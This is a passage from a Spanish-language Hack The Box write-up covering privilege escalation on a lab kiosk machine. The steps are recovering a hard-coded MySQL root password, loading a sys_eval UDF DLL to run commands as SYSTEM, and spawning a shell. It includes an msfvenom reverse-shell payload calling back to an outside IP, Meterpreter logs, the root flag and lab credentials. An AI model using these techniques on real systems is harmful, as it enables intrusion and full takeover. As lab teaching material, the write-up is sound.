La búsqueda de configuraciones no reveló de inmediato las credenciales de `root`. Se amplió entonces la enumeración a scripts de mantenimiento que pudieran ejecutar tareas administrativas con credenciales embebidas.

- `dir /s /b C:\*.ps1`

```
C:\ProgramData\HTB Airways\db-sync-replica.ps1

# al tratar de abrirlo
type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"
Access is denied.
```

- `type "C:\ProgramData\HTB Airways\refresh-dates.bat"`

```
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

```

- `type "C:\ProgramData\HTB Airways\refresh-dates.sql"`

```
USE htb_airways;

UPDATE flights SET
  dep_time = DATE_FORMAT(
    DATE_ADD(NOW(), INTERVAL (CONV(SUBSTRING(MD5(segment_id),1,4),16,10) % 72) HOUR),
    '%Y-%m-%dT%H:%i:00Z'
  ),
  arr_time = DATE_FORMAT(
    DATE_ADD(NOW(), INTERVAL (CONV(SUBSTRING(MD5(segment_id),1,4),16,10) % 72 + 4 + CONV(SUBSTRING(MD5(segment_id),5,2),16,10) % 16) HOUR),
    '%Y-%m-%dT%H:%i:00Z'
  );

UPDATE bookings SET
  created_at = DATE_SUB(NOW(), INTERVAL (1 + CONV(SUBSTRING(MD5(pnr),1,4),16,10) % 90) DAY)
WHERE created_at < DATE_SUB(NOW(), INTERVAL 100 DAY);

UPDATE boarding_passes bp
JOIN flights f ON f.segment_id = bp.segment_id
SET bp.boarding_time = DATE_FORMAT(DATE_SUB(f.dep_time, INTERVAL 45 MINUTE), '%H:%i');

UPDATE htb_airways._sync_metadata SET
  started_at = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(id),1,4),16,10) % 720) MINUTE),
  completed_at = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(id),1,4),16,10) % 720 - 1) MINUTE)
WHERE started_at < DATE_SUB(NOW(), INTERVAL 7 DAY);

USE nexion_devices;

UPDATE devices SET
  last_used = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(device_id),1,2),16,10) % 6) HOUR),
  last_maintenance = DATE_SUB(NOW(), INTERVAL (7 + CONV(SUBSTRING(MD5(device_id),3,2),16,10) % 30) DAY),
  installed_at = DATE_SUB(NOW(), INTERVAL (180 + CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 200) DAY)
WHERE device_type = 'scanner';

UPDATE devices SET
  last_used = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(device_id),1,2),16,10) % 4) HOUR),
  last_maintenance = DATE_SUB(NOW(), INTERVAL (7 + CONV(SUBSTRING(MD5(device_id),3,2),16,10) % 30) DAY),
  installed_at = DATE_SUB(NOW(), INTERVAL (180 + CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 200) DAY)
WHERE device_type = 'printer';

UPDATE devices SET last_calibration = DATE_SUB(NOW(), INTERVAL (1 + CONV(SUBSTRING(MD5(device_id),7,2),16,10) % 14) DAY)
WHERE device_type = 'scanner';

UPDATE devices SET usage_count = 24000 + (CONV(SUBSTRING(MD5(device_id),1,4),16,10) % 8000)
WHERE device_type = 'scanner';

UPDATE devices SET usage_count = 18000 + (CONV(SUBSTRING(MD5(device_id),1,4),16,10) % 6000)
WHERE device_type = 'printer';

UPDATE devices SET paper_level = 60 + (CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 35)
WHERE device_type = 'printer';

UPDATE devices SET powered = 1, status = 'online';
```

### 7. Recuperación de las credenciales de root de MySQL

El archivo `refresh-dates.bat` contenía un comando de conexión a MySQL con una contraseña explícita para el usuario `root`. Esto permitió autenticarse directamente en el servidor local y consultar sus usuarios, así como los parámetros relevantes para la carga de UDF.



```
mysql -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -e "SELECT user, host FROM mysql.user;"

mysql: [Warning] Using a password on the command line interface can be insecure.
user	host
kiosk_app	localhost
mysql.infoschema	localhost
mysql.session	localhost
mysql.sys	localhost
nexion_app	localhost
repl_kiosk_b7	localhost
root	localhost
```
```
mysql -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -e "SHOW VARIABLES LIKE 'plugin_dir';"

mysql: [Warning] Using a password on the command line interface can be insecure.
Variable_name	Value
plugin_dir	C:\\MySQL\\lib\\plugin\\

mysql -u root -p"HTB@irw4ys_DB!2026" -h 127.0.0.1 -e "SHOW VARIABLES LIKE 'secure_file_priv';"
mysql: [Warning] Using a password on the command line interface can be insecure.
Variable_name	Value
secure_file_priv	NULL
```

### 8. Escalada a SYSTEM mediante una UDF de MySQL

Como `C:\MySQL\lib\plugin` es escribible por el usuario autenticado y el servicio MySQL se ejecuta como **LocalSystem**, se investigó el uso de una User-Defined Function (UDF). La UDF se carga dentro del proceso del servidor MySQL; por tanto, si la función se registra y ejecuta correctamente, sus operaciones se realizan con el contexto de seguridad de ese proceso.

#### 1. Preparar la DLL

> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.50 LPORT=4444 -f dll > payload.dll`

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of dll file: 9216 bytes
```

#### 2. Subir la biblioteca al directorio de plugins

`upload /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll`

```
[*] Uploading  : /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
[*] Completed  : /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll -> C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

#### 3. Registrar la función en MySQL

```
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"

mysql -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
```

#### 4. Verificar la ejecución como SYSTEM

```
C:\Users\KioskUser\Downloads>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
mysql: [Warning] Using a password on the command line interface can be insecure.

C:\Users\KioskUser\Downloads>C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('whoami');"
mysql: [Warning] Using a password on the command line interface can be insecure.
sys_eval('whoami')
nt authority\\system
```

---


### 9. Obtener una shell con privilegios elevados

```
C:\Windows\Temp>exit
(Meterpreter 2)(C:\Users\KioskUser\Downloads) > upload /home/kerbero/profile/htbhackthebox/machines/season_12/Touch/share/sys_shell.exe "C:\\Users\\Public\\sys_shell.exe"
[*] Uploading  : /home/kerbero/profile/htbhackthebox/machines/season_12/Touch/share/sys_shell.exe -> C:\Users\Public\sys_shell.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kerbero/profile/htbhackthebox/machines/season_12/Touch/share/sys_shell.exe -> C:\Users\Public\sys_shell.exe
[*] Completed  : /home/kerbero/profile/htbhackthebox/machines/season_12/Touch/share/sys_shell.exe -> C:\Users\Public\sys_shell.exe
(Meterpreter 2)(C:\Users\KioskUser\Downloads) > shell
Process 1128 created.
Channel 6 created.
Microsoft Windows [Version 10.0.26100.9457]
(c) Microsoft Corporation. All rights reserved.

C:\Users\KioskUser\Downloads>dir C:\Users\Public\sys_shell.exe
dir C:\Users\Public\sys_shell.exe
 Volume in drive C has no label.
 Volume Serial Number is 9B34-EFD9

 Directory of C:\Users\Public

10/10/2026  05:15 AM             7,680 sys_shell.exe
               1 File(s)          7,680 bytes
               0 Dir(s)   8,719,020,032 bytes free

C:\Users\KioskUser\Downloads>
```

C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('C:\\Users\\Public\\sys_shell.exe');"

---

La ejecución de `sys_eval('whoami')` devolvió `nt authority\\system`, confirmando ejecución de comandos con privilegios `SYSTEM`. Después se preparó `sys_shell.exe` para obtener una shell interactiva con esos privilegios y acceder al escritorio de `Administrator`.

## Root Flag

C:\Users\Administrator\Desktop>type root.txt
type root.txt
02eeb976f86cd48ea8a927c532f83ba0

```text
root.txt:
02eeb976f86cd48ea8a927c532f83ba0
```

---

## Credentials

| Servicio | Usuario | Contraseña |
|---|---|---|
| Nexion DeviceHub | No identificado | Número de serie del dispositivo (`NX-DH-2024-B7042`) |
| Entorno kiosco / credenciales del dashboard | `KioskUser` | `K!0sk2026#` |
| MySQL | Pendiente de identificar | Pendiente de identificar |

> Las credenciales deben distinguirse de las pistas de autenticación. El número de serie se utilizó como contraseña del panel, pero todavía debe confirmarse si corresponde a una cuenta del sistema operativo o a un mecanismo de autenticación específico del dispositivo.

---

## Lessons Learned

- Las API sin autenticación pueden exponer información que facilite el acceso a un panel administrativo.
- Los números de serie y otros identificadores no deben utilizarse como contraseñas.
- Las interfaces de kiosco y los diálogos de archivos pueden convertirse en vías de evasión si no están correctamente restringidos.
- La enumeración de servicios de Windows debe incluir permisos del ejecutable, directorios, bibliotecas y cuenta de ejecución.
- Los permisos `Modify` para `Authenticated Users` en directorios de servicios representan una configuración peligrosa.
- Una posible vulnerabilidad de DLL hijacking requiere comprobar la carga efectiva de la biblioteca y las condiciones de ejecución.
- Los resultados de herramientas automatizadas como WinPEAS son hipótesis de investigación, no pruebas definitivas de explotabilidad.
- La escalada debe documentarse con evidencias verificables: cuenta efectiva, privilegios obtenidos y acceso final a `root.txt`.